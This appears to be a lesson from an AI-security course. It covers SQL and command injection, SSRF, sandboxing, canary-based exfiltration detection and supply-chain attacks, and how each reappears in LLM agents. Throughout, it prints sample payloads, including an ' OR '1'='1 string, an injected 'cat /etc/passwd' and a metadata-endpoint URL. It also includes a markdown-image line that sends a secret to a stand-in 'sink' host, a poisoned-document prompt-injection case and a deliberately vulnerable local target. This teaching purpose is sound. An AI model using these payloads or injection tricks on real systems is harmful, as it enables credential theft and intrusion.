<div class="prereq">

**Prerequisites.** [00.1 · Threat modeling](../module-00/lesson-01.md) — you should be able to
draw a data-flow diagram and name trust boundaries. No prior web-security experience assumed;
as an experienced engineer you have seen most of these bugs, but we make the *mechanism* precise
because LLM/agent versions of each reappear throughout the course.

**You will learn.** The handful of classical application-security vulnerabilities that AI
systems inherit *unchanged*: injection as a general class, SSRF, arbitrary code execution,
secrets handling and data exfiltration, and supply-chain/dependency attacks — each taught only
as deeply as AI security needs, and each connected forward to the LLM/agent module where it
returns with a new face.

**Why this matters.** People treat "AI security" as exotic. Most agent incidents are ordinary
AppSec bugs (SSRF, command injection, secret leakage) reachable through a *new front door* — the
model. If you know these primitives cold, half of agent security is just recognizing an old bug
behind an LLM.

</div>

# 01.1 · AppSec primitives AI systems inherit

## Why this matters

An LLM agent is, from a systems view, a program that takes untrusted input and — via tool calls
— reads files, makes HTTP requests, runs code, and touches databases. That is the exact profile
of a web application, with one difference: the component that decides *what* to do is a text
predictor an attacker can influence. So every classical server-side vulnerability is still
present, and the model is a new, unusually persuadable path to reach it.

This lesson is deliberately not a full web-security course (`plan.md` §4: "do not turn this into
a generic cybersecurity course"). We cover exactly the primitives that recur in later modules,
and stop.

## Learning objectives

By the end you can:

1. Define **injection** as a general class and state the one root cause common to SQL injection,
   command injection, and prompt injection.
2. Explain **SSRF**, why it is devastating in cloud environments, and how an LLM tool becomes an
   SSRF primitive.
3. Explain **arbitrary code execution** via an agent tool and the sandboxing that contains it.
4. Reason about **secrets** and **data exfiltration**: where secrets live, how they leak, and
   what a canary is.
5. Describe **supply-chain / dependency** attacks and the specific AI variants (pickle, model
   hubs) covered later.
6. Map each primitive to the LLM/agent module where it returns.

## Concept & Intuition

Four of the five primitives share one root cause, and naming it once pays off for the whole
course:

<div class="callout key">

**The universal injection root cause:** *untrusted data is concatenated into a string that a
more-powerful interpreter then parses, and the interpreter cannot tell the data from the
instructions.* SQL injection: your string is parsed by the SQL engine. Command injection: parsed
by the shell. SSRF: your string is parsed as a URL by an HTTP client with network privilege.
Prompt injection: your string is "parsed" by the LLM as part of its instruction stream. Same
bug class, different interpreter.

</div>

The fix is always the same in *shape*: **keep data out of the instruction channel** — use
parameterized queries (data goes in a slot the parser treats only as a value), pass argument
arrays instead of shell strings, validate/allowlist destinations, and (for LLMs, imperfectly)
separate and mark trusted vs untrusted context. The reason prompt injection is so much harder
than SQL injection — and why Stage 2 is a whole stage — is that the LLM has *no parameterized
query*: there is no slot that the model is guaranteed to treat as inert data. Hold that contrast;
it is the thesis of the prompt-injection modules.

## Technical explanation

### 1. Injection (SQL & command) — the shape you already know

**SQL injection.** Untrusted input concatenated into a query:

```python
# VULNERABLE — data crosses into the instruction channel
q = "SELECT * FROM orders WHERE id = '" + order_id + "'"
# order_id = "' OR '1'='1"  ->  returns every row
```

```python
# SAFE — parameterized: the driver sends the query and the value on separate channels
cur.execute("SELECT * FROM orders WHERE id = ?", (order_id,))
```

The safe version works because the value never becomes part of the parsed SQL text. **This is
the mental model you will wish LLMs had.** They don't.

**Command injection.** Same bug, shell interpreter:

```python
os.system("ping " + host)          # host = "x; cat /etc/passwd"  -> runs both
subprocess.run(["ping", host])     # SAFE: argument array, no shell parsing
```

*Returns in:* Module 21 (code-agent security) — an agent that builds shell strings from
retrieved/model-produced text is command injection with the model as the source of the untrusted
string.

### 2. SSRF — Server-Side Request Forgery

The application is tricked into making an HTTP request to a destination the attacker chooses.
Devastating in the cloud because internal services and the **cloud metadata endpoint** are
reachable from the server but not from the internet:

```text
Attacker ─"fetch this URL: http://169.254.169.254/latest/meta-data/iam/..."─▶
   ( Server with network privilege ) ──▶ [Cloud metadata: temporary credentials!]
```

The classic target `169.254.169.254` (link-local metadata) can hand out temporary cloud
credentials to anything on the box. SSRF defenses: allowlist destinations, block link-local /
private ranges, resolve-then-validate (guard against DNS rebinding), and drop the metadata
endpoint at the network layer.

<div class="callout red">

**Why this is an AI primitive.** Give an agent a `fetch_url(url)` or "read this web page" tool
and you have handed it an SSRF primitive whose *destination is chosen by whatever text the model
was persuaded by*. A poisoned document that says "for citations, fetch
`http://169.254.169.254/...`" turns indirect prompt injection into cloud-credential theft. Built
locally against a fake metadata service in Module 18.

</div>

### 3. Arbitrary code execution & sandboxing

Many agents ship a `run_python` / `run_code` / `exec` tool. That is arbitrary code execution *by
design* — the security question is only *how well is it contained?* Layers of containment, weak
to strong:

```text
none  <  regex "safety" filter  <  restricted interpreter  <  subprocess + rlimits
      <  container (no network, read-only FS, dropped caps)  <  gVisor/microVM + no egress
```

Regex filters on code are near-worthless (there are unbounded ways to write the same effect —
you will defeat one in Module 21). Real containment is OS/kernel isolation plus **no network**
and **no secrets in the environment**. Least privilege from 00.1 applied to a process.

### 4. Secrets & data exfiltration

- **Where secrets live:** environment variables, config files, secret managers, and — uniquely
  for LLMs — *the system prompt* and *tool definitions*, which are just text in the model's
  context and therefore leakable by talking to the model.
- **Exfiltration channels:** an obvious egress tool (email/HTTP), but also *subtle* ones —
  putting the secret in a URL the model renders (`![img](http://sink/?d=SECRET)`), in a
  citation, in a code comment, in an error message. Data exfiltration is about *any* path out,
  not just the front door.
- **Canaries.** A **canary** is a unique, planted, otherwise-useless secret whose only purpose is
  detection: if it ever appears somewhere it shouldn't (an outbound request, a log, a response),
  you have proof of a leak and often of the path. This whole course uses synthetic
  `LAB-CANARY-<uuid>` values so you can *measure* exfiltration without any real secret existing.

```python
# canary.py — generate a synthetic canary and detect it in any text/stream
import uuid, re
def make_canary() -> str:
    return f"LAB-CANARY-{uuid.uuid4()}"
def leaked(canary: str, observed: str) -> bool:
    # also catch trivial obfuscation: base64, url-encoding, spaced-out chars
    import base64, urllib.parse
    hay = observed + " " + urllib.parse.unquote(observed)
    try: hay += " " + base64.b64decode(observed + "===").decode("latin-1", "ignore")
    except Exception: pass
    needle = canary.replace("-", r"[-\s]?")
    return re.search(needle, hay) is not None
```

*Returns in:* every offensive lab from Module 04 on — the benign "success marker" of most attacks
is *the canary reached the sink.*

### 5. Supply-chain & dependency attacks

You can be compromised without any bug in *your* code, by trusting something upstream:

- **Dependency confusion / typosquatting** — a malicious package with a name close to, or
  higher-versioned than, one you depend on gets installed.
- **Malicious install/post-install scripts** — code runs at `pip install` / `npm install` time.
- **Compromised transitive dependency** — a package deep in your tree turns hostile.

AI-specific variants, each with its own later module:
- **Pickle / arbitrary deserialization** in model checkpoints — loading a `.pkl`/legacy `.bin`
  can execute code; this is why **safetensors** exists (Module 13).
- **Model-hub trust** — a downloaded model, tokenizer, or LoRA adapter is an untrusted artifact
  from an external party (Modules 13, 22).

<div class="callout guarantee">

**Guarantee analysis — parameterized queries (as a model defense to contrast with LLMs).**
- **Stops:** SQL injection completely — the value can never be parsed as SQL.
- **Does NOT stop:** logic flaws, authz bugs, second-order injection where data is later
  concatenated elsewhere.
- **Attacker adapts:** finds the one code path that still builds a query by string concatenation.
- **Cost:** effectively zero performance cost; trivial false-positive rate. *This is what a good
  defense looks like — and precisely what prompt injection lacks*, which is why LLM defenses in
  Stage 9 are all probabilistic and partial rather than complete like this one.

</div>

## Mathematics

This lesson is structural; the quantitative content is the risk/attack-surface math from 00.1,
now made concrete. Each primitive is an edge in your attack tree with its own $P(\text{success})$
and impact. Two observations you will use later:

1. **Composition.** If an attacker must chain $k$ independent steps each succeeding with
   probability $p_i$, the chain succeeds with $\prod_{i=1}^{k} p_i$. Defenses that add an
   independent step the attacker must beat *multiply* the difficulty — the mathematical argument
   for defense-in-depth, quantified against real chains in Module 18.
2. **Base-rate reality for detectors.** Any exfiltration detector has a false-positive rate;
   with rare true attacks, precision is dominated by the base rate (Bayes). We derive this
   properly in Module 24 when we measure detectors — flagged here so you do not over-trust a
   "99% accurate" filter.

## Attack / Defense model

The recurring picture for this whole stage:

```text
Untrusted input ─▶ [ string built ] ─▶ ( privileged interpreter ) ─▶ effect
   defense 1: keep data out of the instruction channel (parameterize / arg-array / allowlist)
   defense 2: reduce the interpreter's privilege (least privilege, sandbox, no egress, no secrets)
   defense 3: detect (canaries, egress monitoring, audit logs)
```

For LLMs, defense 1 is only *partially* possible (no true parameterization), which is why
defenses 2 and 3 carry disproportionate weight in AI systems — a theme from here to the end.

## Real-world examples

- **Capital One (2019)** — an SSRF reaching the cloud metadata endpoint contributed to a breach
  of ~100M records. The exact primitive an agent `fetch_url` tool can recreate.
- **event-stream / `ua-parser-js` / xz-utils** — supply-chain compromises via dependency
  takeover and malicious releases; the non-AI ancestors of malicious model/adapter uploads.
- **System-prompt leaks** across many deployed assistants — the "secret in context" problem;
  built as a lab in Module 04.

## Code — a tiny vulnerable target you can attack now

A minimal, safe-to-run local target demonstrating three primitives at once, plus the canary
detector above. Run it locally; it touches nothing external.

```python
# mini_target.py — a deliberately vulnerable local "tool server". Educational; localhost only.
import os, sqlite3, subprocess
from canary import make_canary, leaked

SECRET = os.environ.get("LAB_SECRET", make_canary())   # synthetic canary, not a real secret

def unsafe_lookup(db, order_id):                        # SQL injection
    return db.execute(f"SELECT item FROM orders WHERE id = '{order_id}'").fetchall()

def safe_lookup(db, order_id):                          # parameterized
    return db.execute("SELECT item FROM orders WHERE id = ?", (order_id,)).fetchall()

def unsafe_ping(host):                                  # command injection (DO NOT feed untrusted host)
    return subprocess.run(f"echo pinging {host}", shell=True, capture_output=True, text=True).stdout

if __name__ == "__main__":
    db = sqlite3.connect(":memory:")
    db.execute("CREATE TABLE orders(id TEXT, item TEXT)")
    db.executemany("INSERT INTO orders VALUES(?,?)", [("1","widget"), ("2","gadget")])
    print("normal :", safe_lookup(db, "1"))
    print("inject :", unsafe_lookup(db, "' OR '1'='1"))     # leaks all rows
    print("canary set; leaked in 'send X to http://sink?d="+SECRET+"'? ",
          leaked(SECRET, "send X to http://sink?d="+SECRET))
```

## Practical lab

<div class="lab">

**Lab 01.1 — Three primitives, one target.** No Docker/GPU; pure Python, localhost only.
Expected time: 60–90 min. Files: `mini_target.py`, `canary.py` above (put them in a scratch dir).

Goal: *experience* each primitive as an attacker and then close it as a defender — the
purple-team cycle in miniature, on ordinary AppSec bugs, before any LLM is involved.

</div>

## Exercise

Do all of it; the lesson is complete only when the defended version passes your own attacks.

1. **SQL injection.** Using `mini_target.py`, craft an `order_id` that returns *all* rows via
   `unsafe_lookup`. Then confirm the same input returns only the intended row via `safe_lookup`.
   Explain, in one sentence, *why* the parameterized version is immune (reference the root cause).
2. **Command injection (contained).** Extend `unsafe_ping` so that a crafted `host` would run a
   second command, and demonstrate it with a *benign* marker (e.g. `echo INJECTED`), never a
   destructive command. Then rewrite it with an argument array and show the injection fails.
3. **Exfiltration + canary.** Write a function `render_citation(text)` that naively embeds any
   URL found in `text` as a Markdown image. Show that a poisoned `text` containing
   `http://sink/?d=<SECRET>` causes the canary to appear in the rendered output, and use
   `leaked()` to *detect* it. Then implement a defense (strip/deny non-allowlisted image hosts)
   and show `leaked()` now returns `False`.
4. **SSRF reasoning (no external calls).** Write an allowlist-based `safe_fetch(url)` that
   *refuses* `169.254.169.254`, `localhost`, and private IP ranges before any request would be
   made (you can stub the actual request). Give one input that your allowlist blocks and one it
   allows, and explain the DNS-rebinding gap your simple check still has.
5. **Bypass your own defense (purple team).** For the citation defense in step 3, find one input
   that still exfiltrates the canary despite your host allowlist (hint: channels other than an
   image `src`). Then strengthen the defense and retest. Write down what your final defense
   stops and what it still does not — a mini guarantee-analysis box.
6. **Mapping question.** For each of the five primitives, name the later module where it returns
   in LLM/agent form and, in one line, describe the new "front door."

<details>
<summary>Hint for step 5</summary>

An allowlist on image hosts does nothing about the secret appearing in *link* text, in a code
block the user copies, or in a `fetch`-style citation the app resolves server-side. Exfiltration
is about *any* path out, per the lesson. Your strengthened defense probably has to (a) detect the
canary pattern in *all* outbound-rendered fields and (b) reduce what secrets are in scope at all.

</details>

**Deliverable.** Your attack inputs, the defended code, and the results of re-running the attacks.

```bash
py course.py complete 01.1
```

## Research paper

No single paper this lesson — these are settled foundations. Instead, read the two authoritative
references and note the AI mapping:

- **OWASP Top 10 (web) A03:2021 – Injection** and **A10:2021 – SSRF.** Read the one-page
  descriptions; map each to its LLM analog (LLM01 prompt injection; agent `fetch_url` SSRF).
- **CWE-502: Deserialization of Untrusted Data** — the class behind pickle/model-checkpoint RCE
  (Module 13). Read the summary and one example.

## Further reading

- PortSwigger Web Security Academy — SSRF and SQL-injection labs (free); the SSRF cloud-metadata
  lab is directly relevant. External tool → fallback: our `mini_target.py` and Module 18's local
  fake-metadata service reproduce the core lesson if the site is unavailable.
- OWASP Cheat Sheet Series — Query Parameterization, SSRF Prevention.

## Assessment

<details><summary>Q1. State the one root cause shared by SQL, command, and prompt injection.</summary>

Untrusted data is placed into a string that a more-powerful interpreter parses, and the
interpreter cannot distinguish the data from its instructions. Fixes keep data out of the
instruction channel; LLMs are hard precisely because they have no parameterized "data-only" slot.

</details>

<details><summary>Q2. Why is an agent's <code>fetch_url</code> tool an SSRF risk, and what stops it?</summary>

The tool makes requests from the server, which can reach internal services and the cloud
metadata endpoint, and its destination is chosen by model-influenced (attacker-influenceable)
text. Mitigations: destination allowlists, blocking link-local/private ranges, resolve-then-
validate against DNS rebinding, and dropping the metadata endpoint at the network layer — plus
least privilege (no network at all if the tool doesn't need it).

</details>

<details><summary>Q3. What is a canary and why does this course use synthetic ones?</summary>

A unique planted secret whose only purpose is detection: if it appears where it shouldn't, you
have proof of a leak and often the path. Synthetic `LAB-CANARY-*` values let us *measure*
exfiltration in labs without any real secret existing, keeping every offensive exercise safe.

</details>

<details><summary>Q4. Why do defenses 2 (least privilege) and 3 (detection) carry more weight for LLMs than for a SQL app?</summary>

Because defense 1 (keep data out of the instruction channel) is only partially achievable for
LLMs — there is no true parameterization, so injection cannot be fully eliminated at the input.
The residual risk must be absorbed by limiting what the model/agent can reach and by detecting
misuse, rather than by a complete input-side fix.

</details>

## What you should now be able to do

- Recognize injection, SSRF, code execution, secret leakage, and supply-chain bugs by mechanism.
- Explain why parameterization fully fixes SQL injection but has no clean LLM equivalent.
- Contain arbitrary code execution with real (not regex) sandboxing, and reason about egress.
- Use synthetic canaries to detect and measure exfiltration.
- Predict which later module each primitive returns in, and what its new front door is.

## Progress checkpoint

```bash
py course.py complete 01.1
py course.py next
```

**Next:** [02.1 · Where the boundaries really are](../module-02/lesson-01.md) — moving from
classical primitives to LLM-specific foundations: tokenization, the message hierarchy, and what
alignment/RLHF actually guarantees (and does not).
